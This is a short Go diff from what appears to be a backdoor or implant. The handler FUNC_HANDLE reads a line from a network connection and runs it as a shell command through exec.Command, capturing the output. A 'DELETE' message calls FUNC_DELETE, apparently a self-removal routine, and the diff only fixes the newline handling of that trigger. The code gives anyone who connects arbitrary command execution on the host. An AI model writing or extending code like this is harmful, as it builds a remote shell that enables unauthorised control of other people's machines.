@@ -20,7 +20,7 @@ func FUNC_SLEEP(){
 
 func FUNC_HANDLE(conn net.Conn){
     message, _ := bufio.NewReader(conn).ReadString('\n')
-    if message == "DELETE" {
+    if message == "DELETE\n" {
         FUNC_DELETE()
     }
     out, err := exec.Command(strings.TrimSuffix(message, "\n")).Output()
